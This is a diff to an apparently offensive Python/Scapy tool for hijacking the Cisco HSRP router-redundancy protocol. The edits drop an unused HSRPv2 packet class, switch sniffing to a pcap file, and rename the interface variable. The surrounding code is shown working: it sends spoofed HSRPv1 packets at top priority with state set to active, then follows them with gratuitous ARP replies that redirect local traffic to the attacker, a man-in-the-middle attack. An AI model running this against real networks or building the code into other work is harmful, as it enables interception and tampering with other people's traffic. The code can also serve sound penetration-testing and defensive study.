@@ -12,23 +12,6 @@ poisonrouter = True
 attackportsecurity = True
 debug = True
 
-#not in use
-class v2(Packet):
-    name="HSRPv2"
-    fields_desc = [ BitField("twobyte", 0x0128, 16),
-                    BitField("version", 2, 8),
-                    BitField("opcode", 1, 8),
-                    BitField("state", 1, 8),
-                    BitField("ipver", 4, 8),
-                    BitField("group", None, 16),
-                    BitField("identifier", 0x34ed1b888888, 48),
-                    BitField("priority", 0x000000ff, 32),
-                    BitField("hellotime", 0x00000bb8, 32),
-                    BitField("holdtime", 0x00002710, 32),
-                    BitField("virtualip", None, 32),
-                    BitField("padding", 0, 112),
-                    BitField("auth", 0x636973636f000000, 64) ]
-
 myip = ni.ifaddresses(interface)[ni.AF_INET][0]["addr"]
 mymac = ni.ifaddresses(interface)[ni.AF_LINK][0]["addr"]
 mynetmask = ni.ifaddresses(interface)[ni.AF_INET][0]['netmask']
@@ -42,7 +25,7 @@ pkcopy: Packet
 def find_hsrp():
     #consider offline="filename" to test with pcap file
     print("Listening for active HSRP packets on UDP port 1985...")
-    sniff(prn=check_hsrp, filter="udp and udp dst port 1985", stop_filter=hsrp_found)
+    sniff(prn=check_hsrp, filter="udp and udp dst port 1985", stop_filter=hsrp_found, offline="hsrp v2.pcap")
     if hsrpfound:
         return True
     return False
@@ -118,7 +101,7 @@ def send_hsrp(packet):
         # Start sending spoofed HSRPv1 and ARP packet
         print("Hijacking HSRPv1...")
         pkt = Ether(dst=etherdst, src=ethersrc)/IP(dst=ipdst, ttl=ipttl)/UDP(sport=sport, dport=dport)/HSRP(opcode=1, state=16, hellotime=hellotime, holdtime=holdtime, priority=255, group=group, auth=auth, virtualIP=virtualIP)
-        
+        # Mimic sending pattern of cisco HSRP routers with 2 ARP broadcast
         sendp(pkt, verbose=False)
         send_initial_arp(packet)
         pkt[HSRP].opcode = 0
@@ -143,7 +126,7 @@ def send_hsrp(packet):
         send_initial_arp(packet)
         sendp(pkt, verbose=False)
         send_initial_arp(packet)
-        sendp(pkt, iface=nic, inter=3, loop=1)
+        sendp(pkt, iface=interface, inter=3, loop=1)
 
 # Send arp with own mac address and HSRP virtual ip to redirect local traffic to attacker
 def send_initial_arp(packet):
